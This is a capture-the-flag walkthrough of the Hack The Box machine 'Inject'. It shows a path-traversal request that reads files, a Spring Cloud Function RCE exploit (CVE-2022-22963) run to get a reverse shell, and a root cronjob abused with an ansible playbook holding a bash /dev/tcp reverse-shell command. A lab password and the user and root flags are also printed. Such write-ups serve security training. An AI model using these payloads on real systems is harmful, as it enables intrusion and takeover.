---
title: "Inject from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Inject from HTB
`nmap`gave this:
```bash
22/tcp    open     ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)

8080/tcp  open     nagios-nsca Nagios NSCA
|_http-title: Home
```
Access the `port 8080`and see that it has `upload`which only takes `images`upload image and click `view your image`and in `url`you can see this:
```
http://10.10.11.204:8080/show_image?img=something_something
```
It means that it takes `image`you uploaded. It's `LFI`exploitable. So go to `burpsuite`and do `LFI`attack. After some exploring `version`can be found in here
```
GET /show_image?img=../../../../../../var/www/WebApp/pom.xml HTTP/1.1
```
Here is the version:
```
<dependency>
			<groupId>org.springframework.cloud</groupId>
			<artifactId>spring-cloud-function-web</artifactId>
			<version>3.2.2</version>
		</dependency>
```
Search shows it is exploitable and i found an `RCE code`to get reverse shell in github:
https://github.com/randallbanner/Spring-Cloud-Function-Vulnerability-CVE-2022-22963-RCE/blob/main/spring-cloud-rce.py
# you must configure the code to your IP, PORT and MACHINE IP
Then start `NetCat`listener on port you want and execute the code.
```python
python3 spring-cloud-rce-3.2.2.py
[+] Serving on port 8000
[!] Press Ctrl+C to stop the server
[+] Creating shell.sh in current Directory...
[++] Done
[+] Sending shell to /dev/shm/shell.sh...
[++] Done
[+] Giving the server time to process...
	z z z z z
10.10.11.204 - - [12/Aug/2024 19:49:38] "GET /shell.sh HTTP/1.1" 200 -
	z z z z
	z z z
	z z
	z
[++] Countdown finished!
[+] Making the shell executable...
[++] Done
[+] Executing shell...
[+] Server stopped.


 rlwrap nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.204] 56412
/bin/sh: 0: can't access tty; job control turned off
$ script /dev/null -c bash
Script started, file is /dev/null
frank@inject:/$
```
We are in.
Password for other user is located in `/home/frank/.m2/settings.xml`read it and get the password.
it is: `DocPhillovestoInject123`
***
User Flag is: feb816665bae93aa3a60ee369df26a17
***

Then download `pspy64s`on machine and run it. There is `cronjob`which you will use to do `privilege escalation`.
```python
./pspy64s
.......

..........
..............
..................
2024/08/12 16:30:01 CMD: UID=0    PID=5639   | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
2024/08/12 16:30:01 CMD: UID=0    PID=5638   | /bin/sh -c sleep 10 && /usr/bin/rm -rf /opt/automation/tasks/* && /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/
```
So there is an `/usr/local/bin/ansible-parallel`which runs `*.yml`files located in `/opt/automation/tasks/`directory. `UID=0`which means this command is run by `root`.
So if we do reverse shell we will be `root`.
create an `reverse.yml` in `/opt/automation/tasks/` with commands:
```yml
- hosts: localhost
  tasks:
  - name: Checking webapp service
    shell:
      cmd: bash -c 'bash -i >& /dev/tcp/<your_IP>/<port> 0>&1'
```
And wait for it to be executed. `DONT FORGET to set netcat listener`
```bash
nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.204] 33378
bash: cannot set terminal process group (8039): Inappropriate ioctl for device
bash: no job control in this shell
root@inject:/opt/automation/tasks#
```
***
Root Flag is: ffae042f498cf72f0d7017c6bcd21d3f
***
![](/assets/images/Screenshot from 2024-08-12 21-06-31.png)
